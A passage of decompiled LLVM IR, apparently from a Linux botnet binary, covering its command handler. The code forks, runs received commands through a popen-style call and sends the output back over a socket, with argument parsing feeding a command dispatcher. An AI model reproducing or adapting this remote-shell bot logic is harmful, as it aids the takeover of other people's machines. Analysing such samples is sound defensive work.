  %v1_804ffa9 = inttoptr i32 %v1_804ffa8 to i8*
  %v2_804ffa9 = load i8, i8* %v1_804ffa9, align 1
  %v3_804ffa9 = zext i8 %v2_804ffa9 to i32
  %v5_804ffa9 = and i32 %v1_804ffa8, -256
  %v6_804ffa9 = or i32 %v3_804ffa9, %v5_804ffa9
  store i32 %v6_804ffa9, i32* %eax.global-to-local, align 4
  %v6_804ffab = icmp ult i8 %v2_804ffa9, 10
  store i1 %v6_804ffab, i1* %cf.global-to-local, align 1
  %v10_804ffab = icmp eq i8 %v2_804ffa9, 10
  br i1 %v10_804ffab, label %dec_label_pc_804ff62, label %dec_label_pc_804ffaf

dec_label_pc_804ffaf:                             ; preds = %dec_label_pc_804ff87
  store i32 %v1_804ff95, i32* %eax.global-to-local, align 4
  %v3_804ffc6 = call i32 @_strlen(i8* %v5_804ff5d)
  %v4_804ffc6 = mul i32 %v3_804ffc6, -1
  %v1_804ffcc = sub i32 0, %v4_804ffc6
  %v6_804ffcd = sub i32 %v1_804ff5a, %v4_804ffc6
  %v11_804ffcd = icmp ult i32 %v6_804ffcd, %v1_804ffcc
  store i1 %v11_804ffcd, i1* %cf.global-to-local, align 1
  %v1_804ffd0 = add i32 %v6_804ffcd, -1
  store i32 %v1_804ffd0, i32* %eax.global-to-local, align 4
  %v1_804ffd1 = inttoptr i32 %v1_804ffd0 to i8*
  %v2_804ffd1 = load i8, i8* %v1_804ffd1, align 1
  %v3_804ffd1 = zext i8 %v2_804ffd1 to i32
  %v5_804ffd1 = and i32 %v1_804ffd0, -256
  %v6_804ffd1 = or i32 %v3_804ffd1, %v5_804ffd1
  store i32 %v6_804ffd1, i32* %eax.global-to-local, align 4
  %v6_804ffd3 = icmp ult i8 %v2_804ffd1, 13
  store i1 %v6_804ffd3, i1* %cf.global-to-local, align 1
  %v10_804ffd3 = icmp eq i8 %v2_804ffd1, 13
  br i1 %v10_804ffd3, label %dec_label_pc_804ff62, label %dec_label_pc_804ffd7

dec_label_pc_804ffd7:                             ; preds = %dec_label_pc_804ffaf
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  %v2_804ffe5207 = load i8, i8* %v5_804ff5d, align 1
  %v3_804ffe5208 = zext i8 %v2_804ffe5207 to i32
  %v6_804ffe5210 = or i32 %v3_804ffe5208, %v1_804ff95
  store i32 %v6_804ffe5210, i32* %eax.global-to-local, align 4
  %v3_804ffe7211 = icmp ult i8 %v2_804ffe5207, 32
  store i1 %v3_804ffe7211, i1* %cf.global-to-local, align 1
  %v7_804ffe7212 = icmp eq i8 %v2_804ffe5207, 32
  br i1 %v7_804ffe7212, label %dec_label_pc_804fff4, label %dec_label_pc_804ffeb

dec_label_pc_804ffdf:                             ; preds = %dec_label_pc_804ffeb
  %v5_804ffdf = add i32 %v4_804ffe2214, 1
  %v22_804ffdf = inttoptr i32 %v5_804ffdf to i8*
  store i32 %v5_804ffdf, i32* %eax.global-to-local, align 4
  %v2_804ffe5 = load i8, i8* %v22_804ffdf, align 1
  %v3_804ffe5 = zext i8 %v2_804ffe5 to i32
  %v5_804ffe5 = and i32 %v5_804ffdf, -256
  %v6_804ffe5 = or i32 %v3_804ffe5, %v5_804ffe5
  store i32 %v6_804ffe5, i32* %eax.global-to-local, align 4
  %v3_804ffe7 = icmp ult i8 %v2_804ffe5, 32
  store i1 %v3_804ffe7, i1* %cf.global-to-local, align 1
  %v7_804ffe7 = icmp eq i8 %v2_804ffe5, 32
  br i1 %v7_804ffe7, label %dec_label_pc_804fff4, label %dec_label_pc_804ffeb

dec_label_pc_804ffeb:                             ; preds = %dec_label_pc_804ffd7, %dec_label_pc_804ffdf
  %v5_804ffe5215 = phi i32 [ %v5_804ffe5, %dec_label_pc_804ffdf ], [ %v1_804ff95, %dec_label_pc_804ffd7 ]
  %v4_804ffe2214 = phi i32 [ %v5_804ffdf, %dec_label_pc_804ffdf ], [ %v1_804ff5a, %dec_label_pc_804ffd7 ]
  %stack_var_-64.1213 = phi i8* [ %v22_804ffdf, %dec_label_pc_804ffdf ], [ %v5_804ff5d, %dec_label_pc_804ffd7 ]
  store i32 %v4_804ffe2214, i32* %eax.global-to-local, align 4
  %v2_804ffee = load i8, i8* %stack_var_-64.1213, align 1
  %v3_804ffee = zext i8 %v2_804ffee to i32
  %v6_804ffee = or i32 %v3_804ffee, %v5_804ffe5215
  store i32 %v6_804ffee, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fff0 = icmp eq i8 %v2_804ffee, 0
  %v1_804fff2 = icmp eq i1 %v4_804fff0, false
  br i1 %v1_804fff2, label %dec_label_pc_804ffdf, label %dec_label_pc_804fff4

dec_label_pc_804fff4:                             ; preds = %dec_label_pc_804ffdf, %dec_label_pc_804ffeb, %dec_label_pc_804ffd7
  %stack_var_-64.1.lcssa = phi i8* [ %v5_804ff5d, %dec_label_pc_804ffd7 ], [ %stack_var_-64.1213, %dec_label_pc_804ffeb ], [ %v22_804ffdf, %dec_label_pc_804ffdf ]
  %v4_804ffe2.lcssa = phi i32 [ %v1_804ff5a, %dec_label_pc_804ffd7 ], [ %v4_804ffe2214, %dec_label_pc_804ffeb ], [ %v5_804ffdf, %dec_label_pc_804ffdf ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_804fffa = add i32 %v4_804ffe2.lcssa, 1
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  %v2_8050028221 = load i8, i8* %v5_804ff5d, align 1
  %v3_8050028222 = zext i8 %v2_8050028221 to i32
  %v6_8050028224 = or i32 %v3_8050028222, %v1_804ff95
  store i32 %v6_8050028224, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805002a225 = icmp eq i8 %v2_8050028221, 0
  %v1_805002c226 = icmp eq i1 %v4_805002a225, false
  br i1 %v1_805002c226, label %dec_label_pc_8050005, label %dec_label_pc_805002e

dec_label_pc_8050005:                             ; preds = %dec_label_pc_804fff4, %dec_label_pc_8050005
  %storemerge15228 = phi i8* [ %storemerge15, %dec_label_pc_8050005 ], [ %v5_804ff5d, %dec_label_pc_804fff4 ]
  %storemerge15.in227 = phi i32 [ %v5_8050022, %dec_label_pc_8050005 ], [ %v1_804ff5a, %dec_label_pc_804fff4 ]
  store i32 %storemerge15.in227, i32* %eax.global-to-local, align 4
  %v2_8050008 = load i8, i8* %storemerge15228, align 1
  %v3_8050008 = zext i8 %v2_8050008 to i32
  store i32 %v3_8050008, i32* %eax.global-to-local, align 4
  %v0_805000f = load i32, i32* @esp, align 4
  %v5_805000f = icmp ult i32 %v0_805000f, 12
  store i1 %v5_805000f, i1* %cf.global-to-local, align 1
  %v2_8050012 = add i32 %v0_805000f, -16
  %v3_8050012 = inttoptr i32 %v2_8050012 to i32*
  store i32 %v3_8050008, i32* %v3_8050012, align 4
  %v2_8050013 = call i32 @__GI_toupper(i32 %storemerge15.in227)
  %v0_8050018 = load i32, i32* @esp, align 4
  %v2_8050018 = icmp ugt i32 %v0_8050018, -17
  store i1 %v2_8050018, i1* %cf.global-to-local, align 1
  %v1_805001b = urem i32 %v2_8050013, 256
  %v2_805001b = load i32, i32* @edx, align 4
  %v3_805001b = and i32 %v2_805001b, -256
  %v4_805001b = or i32 %v3_805001b, %v1_805001b
  store i32 %v4_805001b, i32* @edx, align 4
  %v1_8050020 = trunc i32 %v2_8050013 to i8
  store i8 %v1_8050020, i8* %storemerge15228, align 1
  %v5_8050022 = add i32 %storemerge15.in227, 1
  %storemerge15 = inttoptr i32 %v5_8050022 to i8*
  store i32 %v5_8050022, i32* %eax.global-to-local, align 4
  %v2_8050028 = load i8, i8* %storemerge15, align 1
  %v3_8050028 = zext i8 %v2_8050028 to i32
  %v5_8050028 = and i32 %v5_8050022, -256
  %v6_8050028 = or i32 %v3_8050028, %v5_8050028
  store i32 %v6_8050028, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805002a = icmp eq i8 %v2_8050028, 0
  %v1_805002c = icmp eq i1 %v4_805002a, false
  br i1 %v1_805002c, label %dec_label_pc_8050005, label %dec_label_pc_805002e

dec_label_pc_805002e:                             ; preds = %dec_label_pc_8050005, %dec_label_pc_804fff4
  %v22_804fffa = inttoptr i32 %v5_804fffa to i8*
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_804ff5a, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8058ccf.453 to i32), i32* @edi, align 4
  %v7_805005e = call i32 @_strncmp(i8* %v5_804ff5d, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8058ccf.453, i32 0, i32 0), i32 3)
  %v8_805005e = urem i32 %v7_805005e, 2
  %v9_805005e = icmp eq i32 %v8_805005e, 0
  %v0_8050060 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050060 = or i1 %v0_8050060, %v9_805005e
  %v3_8050060 = zext i1 %v2_8050060 to i32
  %v4_8050060 = load i32, i32* @edx, align 4
  %v5_8050060 = and i32 %v4_8050060, -256
  %v6_8050060 = or i32 %v3_8050060, %v5_8050060
  %v7_8050060 = xor i32 %v6_8050060, 1
  store i32 %v7_8050060, i32* @edx, align 4
  %v3_8050066 = and i32 %v7_805005e, -256
  %v1_8050068 = trunc i32 %v7_8050060 to i8
  %v3_8050068 = zext i1 %v0_8050060 to i8
  %v4_8050068 = sub nsw i8 %v1_8050068, %v3_8050068
  %v15_8050068 = icmp eq i8 %v4_8050068, 0
  %v20_8050068 = zext i8 %v4_8050068 to i32
  %v23_8050068 = or i32 %v20_8050068, %v3_8050066
  store i32 %v23_8050068, i32* @ecx, align 4
  %v2_805006c = sext i8 %v4_8050068 to i32
  store i32 %v2_805006c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050071 = icmp eq i1 %v15_8050068, false
  br i1 %v1_8050071, label %dec_label_pc_8050167, label %dec_label_pc_8050077

dec_label_pc_8050077:                             ; preds = %dec_label_pc_805002e
  %v0_8050077 = call i32 @listFork()
  store i32 %v0_8050077, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805007c = icmp eq i32 %v0_8050077, 0
  %v1_805007e = icmp eq i1 %v1_805007c, false
  br i1 %v1_805007e, label %dec_label_pc_8050291.outer26.backedge, label %dec_label_pc_8050084

dec_label_pc_8050084:                             ; preds = %dec_label_pc_8050077
  store i32 %v2_8050084, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_8050091 = load i32, i32* @esp, align 4
  %v5_8050091 = icmp ult i32 %v0_8050091, 4
  store i1 %v5_8050091, i1* %cf.global-to-local, align 1
  %v2_8050094 = add i32 %v0_8050091, -8
  %v3_8050094 = inttoptr i32 %v2_8050094 to i32*
  store i32 1024, i32* %v3_8050094, align 4
  %v1_8050095 = add i32 %v0_8050091, -12
  %v2_8050095 = inttoptr i32 %v1_8050095 to i32*
  store i32 0, i32* %v2_8050095, align 4
  %v2_8050097 = add i32 %v0_8050091, -16
  %v3_8050097 = inttoptr i32 %v2_8050097 to i32*
  store i32 %v2_8050084, i32* %v3_8050097, align 4
  %v5_8050098 = call i32 @__GI_memset(i8* inttoptr (i32 3 to i8*), i32 ptrtoint ([3 x i8]* @global_var_8058ccf.453 to i32), i32 %v1_804ff5a)
  %v0_805009d = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8058cd2.454 to i32), i32* %eax.global-to-local, align 4
  %tmp256 = and i32 %v0_805009d, -4
  %v5_80500a5 = icmp eq i32 %tmp256, -16
  store i1 %v5_80500a5, i1* %cf.global-to-local, align 1
  %v6_80500a8 = add i32 %v0_805009d, 8
  %v7_80500a8 = inttoptr i32 %v6_80500a8 to i32*
  store i32 %v5_804fffa, i32* %v7_80500a8, align 4
  %v0_80500ab = load i32, i32* %eax.global-to-local, align 4
  %v2_80500ab = add i32 %v0_805009d, 4
  %v3_80500ab = inttoptr i32 %v2_80500ab to i32*
  store i32 %v0_80500ab, i32* %v3_80500ab, align 4
  store i32 %v2_8050084, i32* %eax.global-to-local, align 4
  %v3_80500b2 = inttoptr i32 %v0_805009d to i32*
  store i32 %v2_8050084, i32* %v3_80500b2, align 4
  %v5_80500b3 = call i32 @szprintf(i32 3, i32 ptrtoint ([3 x i8]* @global_var_8058ccf.453 to i32), i32 %v1_804ff5a, i32 %v1_804ff5a)
  %v0_80500b8 = load i32, i32* @esp, align 4
  %tmp257 = and i32 %v0_80500b8, -8
  %v5_80500c0 = icmp eq i32 %tmp257, -16
  store i1 %v5_80500c0, i1* %cf.global-to-local, align 1
  %v2_80500c3 = add i32 %v0_80500b8, 4
  %v3_80500c3 = inttoptr i32 %v2_80500c3 to i32*
  store i32 ptrtoint (i32* @global_var_8058c7e.443 to i32), i32* %v3_80500c3, align 4
  store i32 %v2_8050084, i32* @eax, align 4
  %v3_80500ca = inttoptr i32 %v0_80500b8 to i32*
  store i32 %v2_8050084, i32* %v3_80500ca, align 4
  %v0_80500cb = call i32 @fdpopen()
  store i32 %v0_80500cb, i32* %eax.global-to-local, align 4
  %v3_805011c = inttoptr i32 %v0_80500cb to i8*
  br label %dec_label_pc_8050131

dec_label_pc_80500d8:                             ; preds = %dec_label_pc_8050131
  store i32 %v2_8050084, i32* %eax.global-to-local, align 4
  %v5_80500de = icmp ult i32 %v1_8050148, 12
  store i1 %v5_80500de, i1* %cf.global-to-local, align 1
  %v3_80500e1 = inttoptr i32 %v0_8050148 to i32*
  store i32 %v2_8050084, i32* %v3_80500e1, align 4
  %v0_80500e2 = call i32 @trim()
  %v0_80500e7 = load i32, i32* @esp, align 4
  %v0_80500ea = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_80500ea, i32* %edx.global-to-local, align 4
  %tmp258 = and i32 %v0_80500e7, -4
  %v5_80500f0 = icmp eq i32 %tmp258, -16
  store i1 %v5_80500f0, i1* %cf.global-to-local, align 1
  store i32 %v2_8050084, i32* %eax.global-to-local, align 4
  %v2_80500f9 = add i32 %v0_80500e7, 8
  %v3_80500f9 = inttoptr i32 %v2_80500f9 to i32*
  store i32 %v2_8050084, i32* %v3_80500f9, align 4
  %v1_80500fa = add i32 %v0_80500e7, 4
  %v2_80500fa = inttoptr i32 %v1_80500fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8058cda.455 to i32), i32* %v2_80500fa, align 4
  %v0_80500ff = load i32, i32* %edx.global-to-local, align 4
  %v3_80500ff = inttoptr i32 %v0_80500e7 to i32*
  store i32 %v0_80500ff, i32* %v3_80500ff, align 4
  %v2_8050100 = call i32 @sockprintf(i32 %v0_80500cb, i32 %stack_var_-28.1.ph)
  %v0_8050105 = load i32, i32* @esp, align 4
  store i32 %v2_8050084, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp259 = and i32 %v0_8050105, -4
  %v5_8050115 = icmp eq i32 %tmp259, -16
  store i1 %v5_8050115, i1* %cf.global-to-local, align 1
  %v2_8050118 = add i32 %v0_8050105, 8
  %v3_8050118 = inttoptr i32 %v2_8050118 to i32*
  store i32 1024, i32* %v3_8050118, align 4
  %v1_8050119 = add i32 %v0_8050105, 4
  %v2_8050119 = inttoptr i32 %v1_8050119 to i32*
  store i32 0, i32* %v2_8050119, align 4
  %v3_805011b = inttoptr i32 %v0_8050105 to i32*
  store i32 %v2_8050084, i32* %v3_805011b, align 4
  %v2_805011c = load i32, i32* %stack_var_-24, align 4
  %v4_805011c = call i32 @__GI_memset(i8* %v3_805011c, i32 %stack_var_-28.1.ph, i32 %v2_805011c)
  store i32 %v4_805011c, i32* %eax.global-to-local, align 4
  %v0_8050121 = load i32, i32* @esp, align 4
  %v1_8050121 = add i32 %v0_8050121, 16
  %v5_8050124 = icmp ult i32 %v1_8050121, 12
  store i1 %v5_8050124, i1* %cf.global-to-local, align 1
  %v2_8050127 = inttoptr i32 %v0_8050121 to i32*
  store i32 1, i32* %v2_8050127, align 4
  %v1_8050129 = call i32 @sleep(i32 %v0_80500cb)
  store i32 %v1_8050129, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050131

dec_label_pc_8050131:                             ; preds = %dec_label_pc_8050084, %dec_label_pc_80500d8
  %storemerge23.in.in = load i32, i32* @esp, align 4
  %tmp260 = and i32 %storemerge23.in.in, -4
  %v5_8050131 = icmp eq i32 %tmp260, -16
  store i1 %v5_8050131, i1* %cf.global-to-local, align 1
  %v5_8050134 = add i32 %storemerge23.in.in, 8
  %v6_8050134 = inttoptr i32 %v5_8050134 to i32*
  store i32 %v0_80500cb, i32* %v6_8050134, align 4
  %v1_8050137 = add i32 %storemerge23.in.in, 4
  %v2_8050137 = inttoptr i32 %v1_8050137 to i32*
  store i32 1024, i32* %v2_8050137, align 4
  store i32 %v2_8050084, i32* %eax.global-to-local, align 4
  %v3_8050142 = inttoptr i32 %storemerge23.in.in to i32*
  store i32 %v2_8050084, i32* %v3_8050142, align 4
  %v2_8050143 = load i32, i32* %stack_var_-24, align 4
  %v3_8050143 = call i32 @fdgets(i32 %v0_80500cb, i32 %stack_var_-28.1.ph, i32 %v2_8050143)
  store i32 %v3_8050143, i32* %eax.global-to-local, align 4
  %v0_8050148 = load i32, i32* @esp, align 4
  %v1_8050148 = add i32 %v0_8050148, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805014b = icmp eq i32 %v3_8050143, 0
  %v1_805014d = icmp eq i1 %v1_805014b, false
  br i1 %v1_805014d, label %dec_label_pc_80500d8, label %dec_label_pc_805014f

dec_label_pc_805014f:                             ; preds = %dec_label_pc_8050131
  %v5_805014f = icmp ult i32 %v1_8050148, 12
  store i1 %v5_805014f, i1* %cf.global-to-local, align 1
  %v6_8050152 = inttoptr i32 %v0_8050148 to i32*
  store i32 %v0_80500cb, i32* %v6_8050152, align 4
  %v0_8050155 = call i32 @fdpclose()
  store i32 %v0_8050155, i32* @eax, align 4
  %v0_805015a = load i32, i32* @esp, align 4
  %v1_805015a = add i32 %v0_805015a, 16
  %v5_805015d = icmp ult i32 %v1_805015a, 12
  store i1 %v5_805015d, i1* %cf.global-to-local, align 1
  %v2_8050160 = inttoptr i32 %v0_805015a to i32*
  store i32 0, i32* %v2_8050160, align 4
  %v1_8050162 = call i32 @__GI_exit(i32 %v0_80500cb)
  store i32 %v1_8050162, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050167

dec_label_pc_8050167:                             ; preds = %dec_label_pc_805002e, %dec_label_pc_805014f
  store i32 %v5_804fffa, i32* @eax, align 4
  %v0_8050171 = load i32, i32* @esp, align 4
  %v5_8050171 = icmp ult i32 %v0_8050171, 8
  store i1 %v5_8050171, i1* %cf.global-to-local, align 1
  %v1_8050174 = add i32 %v0_8050171, -12
  %v2_8050174 = inttoptr i32 %v1_8050174 to i32*
  store i32 ptrtoint (i32* @global_var_8058cdd.456 to i32), i32* %v2_8050174, align 4
  %v0_8050179 = load i32, i32* @eax, align 4
  %v2_8050179 = add i32 %v0_8050171, -16
  %v3_8050179 = inttoptr i32 %v2_8050179 to i32*
  store i32 %v0_8050179, i32* %v3_8050179, align 4
  %v1_805017a = load i8*, i8** %stack_var_-36, align 4
  %v2_805017a = ptrtoint i8* %v1_805017a to i32
  %v3_805017a = call i32 @__GI_strtok(i32 1, i32 %v2_805017a)
  %v0_805017f = load i32, i32* @esp, align 4
  %v1_805017f = add i32 %v0_805017f, 16
  %v5_8050182 = inttoptr i32 %v3_805017a to i8*
  store i8* %v5_8050182, i8** %stack_var_-36, align 4
  store i32 %v1_804ff5a, i32* %eax.global-to-local, align 4
  store i32 %v1_804ff5a, i32* %stack_var_-624, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805023b47 = icmp eq i32 %v3_805017a, 0
  %v1_805023f54 = icmp eq i1 %v5_805023b47, false
  br i1 %v1_805023f54, label %dec_label_pc_8050193, label %dec_label_pc_8050245

dec_label_pc_8050193:                             ; preds = %dec_label_pc_8050167, %dec_label_pc_8050226
  %v0_805022674 = phi i32 [ %v1_8050235, %dec_label_pc_8050226 ], [ %v1_805017f, %dec_label_pc_8050167 ]
  %v3_80501a3 = phi i8* [ %tmp171, %dec_label_pc_8050226 ], [ %v5_8050182, %dec_label_pc_8050167 ]
  %stack_var_-40.155 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8050226 ], [ 1, %dec_label_pc_8050167 ]
  %v4_8050193 = ptrtoint i8* %v3_80501a3 to i32
  store i32 %v4_8050193, i32* %eax.global-to-local, align 4
  %v2_8050196 = load i8, i8* %v3_80501a3, align 1
  %v3_8050196 = zext i8 %v2_8050196 to i32
  %v5_8050196 = and i32 %v4_8050193, -256
  %v6_8050196 = or i32 %v3_8050196, %v5_8050196
  store i32 %v6_8050196, i32* @eax, align 4
  %v6_8050198 = icmp ult i8 %v2_8050196, 10
  store i1 %v6_8050198, i1* %cf.global-to-local, align 1
  %v10_8050198 = icmp eq i8 %v2_8050196, 10
  br i1 %v10_8050198, label %dec_label_pc_8050226, label %dec_label_pc_80501a0

dec_label_pc_80501a0:                             ; preds = %dec_label_pc_8050193
  store i32 %stack_var_-40.155, i32* @ebx, align 4
  store i32 %v5_8050196, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8050193, i32* @edi, align 4
  %v3_80501ba = call i32 @_strlen(i8* %v3_80501a3)
  %v1_80501be = add i32 %v3_80501ba, 1
  store i32 %v1_80501be, i32* %eax.global-to-local, align 4
  %v0_80501c2 = load i32, i32* @esp, align 4
  %v5_80501c2 = icmp ult i32 %v0_80501c2, 12
  store i1 %v5_80501c2, i1* %cf.global-to-local, align 1
  %v2_80501c5 = add i32 %v0_80501c2, -16
  %v3_80501c5 = inttoptr i32 %v2_80501c5 to i32*
  store i32 %v1_80501be, i32* %v3_80501c5, align 4
  %v2_80501c6 = call i32 @malloc(i32 %v4_8050193)
  %v0_80501cb = load i32, i32* @esp, align 4
  %v2_80501cb = icmp ugt i32 %v0_80501cb, -17
  store i1 %v2_80501cb, i1* %cf.global-to-local, align 1
  %v1_80501ce = load i32, i32* @ebp, align 4
  %v2_80501ce = load i32, i32* @ebx, align 4
  %v3_80501ce = mul i32 %v2_80501ce, 4
  %v4_80501ce = add i32 %v1_80501ce, -616
  %v5_80501ce = add i32 %v4_80501ce, %v3_80501ce
  %v6_80501ce = inttoptr i32 %v5_80501ce to i32*
  store i32 %v2_80501c6, i32* %v6_80501ce, align 4
  %v3_80501d5 = load i8*, i8** %stack_var_-36, align 4
  %v4_80501d5 = ptrtoint i8* %v3_80501d5 to i32
  %v1_80501e3 = and i32 %v4_80501d5, -256
  store i32 %v1_80501e3, i32* %eax.global-to-local, align 4
  %v3_80501ec = call i32 @_strlen(i8* %v3_80501d5)
  %v1_80501f0 = add i32 %v3_80501ec, 1
  store i32 %v1_80501f0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_80501f9 = load i32, i32* @ebp, align 4
  %v2_80501f9 = mul i32 %stack_var_-40.155, 4
  %v3_80501f9 = add i32 %v2_80501f9, -616
  %v4_80501f9 = add i32 %v0_80501f9, %v3_80501f9
  %v5_80501f9 = inttoptr i32 %v4_80501f9 to i32*
  %v6_80501f9 = load i32, i32* %v5_80501f9, align 4
  %v1_8050200 = inttoptr i32 %v6_80501f9 to i8*
  store i32 %v6_80501f9, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8050205 = and i32 %v6_80501f9, -256
  store i32 %v1_8050205, i32* %eax.global-to-local, align 4
  %v5_8050207 = call i8* @_memset(i8* %v1_8050200, i32 %v1_8050205, i32 %v1_80501f0)
  %v6_8050207 = ptrtoint i8* %v5_8050207 to i32
  store i32 %v6_8050207, i32* @ecx, align 4
  store i32 %v4_80501d5, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.155, i32* %eax.global-to-local, align 4
  %v0_805020f = load i32, i32* @ebp, align 4
  %v4_805020f = add i32 %v0_805020f, %v3_80501f9
  %v5_805020f = inttoptr i32 %v4_805020f to i32*
  %v6_805020f = load i32, i32* %v5_805020f, align 4
  store i32 %v6_805020f, i32* @eax, align 4
  %v0_8050216 = load i32, i32* @esp, align 4
  %v5_8050216 = icmp ult i32 %v0_8050216, 8
  store i1 %v5_8050216, i1* %cf.global-to-local, align 1
  %v2_8050219 = add i32 %v0_8050216, -12
  %v3_8050219 = inttoptr i32 %v2_8050219 to i32*
  store i32 %v4_80501d5, i32* %v3_8050219, align 4
  %v0_805021a = load i32, i32* @eax, align 4
  %v2_805021a = add i32 %v0_8050216, -16
  %v3_805021a = inttoptr i32 %v2_805021a to i32*
  store i32 %v0_805021a, i32* %v3_805021a, align 4
  %v5_805021b = call i32 @strcpy(i8* %v3_80501d5, i32 %v4_8050193)
  store i32 %v5_805021b, i32* @eax, align 4
  %v0_8050220 = load i32, i32* @esp, align 4
  %v1_8050220 = add i32 %v0_8050220, 16
  %v2_8050220 = icmp ugt i32 %v0_8050220, -17
  store i1 %v2_8050220, i1* %cf.global-to-local, align 1
  %v4_8050223 = add i32 %stack_var_-40.155, 1
  br label %dec_label_pc_8050226

dec_label_pc_8050226:                             ; preds = %dec_label_pc_8050193, %dec_label_pc_80501a0
  %v0_8050226 = phi i32 [ %v0_805022674, %dec_label_pc_8050193 ], [ %v1_8050220, %dec_label_pc_80501a0 ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.155, %dec_label_pc_8050193 ], [ %v4_8050223, %dec_label_pc_80501a0 ]
  %v5_8050226 = icmp ult i32 %v0_8050226, 8
  store i1 %v5_8050226, i1* %cf.global-to-local, align 1
  %v1_8050229 = add i32 %v0_8050226, -12
  %v2_8050229 = inttoptr i32 %v1_8050229 to i32*
  store i32 ptrtoint (i32* @global_var_8058cdd.456 to i32), i32* %v2_8050229, align 4
  %v1_805022e = add i32 %v0_8050226, -16
  %v2_805022e = inttoptr i32 %v1_805022e to i32*
  store i32 0, i32* %v2_805022e, align 4
  %v1_8050230 = load i8*, i8** %stack_var_-36, align 4
  %v2_8050230 = ptrtoint i8* %v1_8050230 to i32
  %v3_8050230 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_8050230)
  store i32 %v3_8050230, i32* %eax.global-to-local, align 4
  %v0_8050235 = load i32, i32* @esp, align 4
  %v1_8050235 = add i32 %v0_8050235, 16
  store i32 %v3_8050230, i32* %tmp169, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805023b = icmp eq i32 %v3_8050230, 0
  %v1_805023f = icmp eq i1 %v5_805023b, false
  %tmp171 = inttoptr i32 %v3_8050230 to i8*
  br i1 %v1_805023f, label %dec_label_pc_8050193, label %dec_label_pc_8050245

dec_label_pc_8050245:                             ; preds = %dec_label_pc_8050226, %dec_label_pc_8050167
  %v0_8050245 = phi i32 [ %v1_805017f, %dec_label_pc_8050167 ], [ %v1_8050235, %dec_label_pc_8050226 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_8050167 ], [ %stack_var_-40.0, %dec_label_pc_8050226 ]
  %v5_8050245 = icmp ult i32 %v0_8050245, 8
  store i1 %v5_8050245, i1* %cf.global-to-local, align 1
  store i32 %v2_8050248, i32* %eax.global-to-local, align 4
  %v2_805024e = add i32 %v0_8050245, -12
  %v3_805024e = inttoptr i32 %v2_805024e to i32*
  store i32 %v2_8050248, i32* %v3_805024e, align 4
  %v5_805024f = add i32 %v0_8050245, -16
  %v6_805024f = inttoptr i32 %v5_805024f to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_805024f, align 4
  %v0_8050252 = call i32 @processCmd()
  store i32 %v0_8050252, i32* %eax.global-to-local, align 4
  %v0_8050257 = load i32, i32* @esp, align 4
  %v9_805025a = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_805025a, i1* %cf.global-to-local, align 1
  %v7_805025e = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_805025e, label %dec_label_pc_8050270.lr.ph, label %dec_label_pc_8050291.outer26.backedge

dec_label_pc_8050270.lr.ph:                       ; preds = %dec_label_pc_8050245
  %v1_8050257 = add i32 %v0_8050257, 16
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8050270

dec_label_pc_8050270:                             ; preds = %dec_label_pc_8050270.lr.ph, %dec_label_pc_8050270
  %storemerge233 = phi i32 [ 1, %dec_label_pc_8050270.lr.ph ], [ %v4_8050286, %dec_label_pc_8050270 ]
  %v0_805027a232 = phi i32 [ %v1_8050257, %dec_label_pc_8050270.lr.ph ], [ %v1_8050283, %dec_label_pc_8050270 ]
  store i32 %storemerge233, i32* %eax.global-to-local, align 4
  %v0_8050273 = load i32, i32* @ebp, align 4
  %v2_8050273 = mul i32 %storemerge233, 4
  %v3_8050273 = add i32 %v2_8050273, -616
  %v4_8050273 = add i32 %v3_8050273, %v0_8050273
  %v5_8050273 = inttoptr i32 %v4_8050273 to i32*
  %v6_8050273 = load i32, i32* %v5_8050273, align 4
  store i32 %v6_8050273, i32* %eax.global-to-local, align 4
  %v5_805027a = icmp ult i32 %v0_805027a232, 12
  store i1 %v5_805027a, i1* %cf.global-to-local, align 1
  %v2_805027d = add i32 %v0_805027a232, -16
  %v3_805027d = inttoptr i32 %v2_805027d to i32*
  store i32 %v6_8050273, i32* %v3_805027d, align 4
  %v1_805027e = call i32 @free(i32 %storemerge233)
  %v0_8050283 = load i32, i32* @esp, align 4
  %v1_8050283 = add i32 %v0_8050283, 16
  %v4_8050286 = add nuw nsw i32 %storemerge233, 1
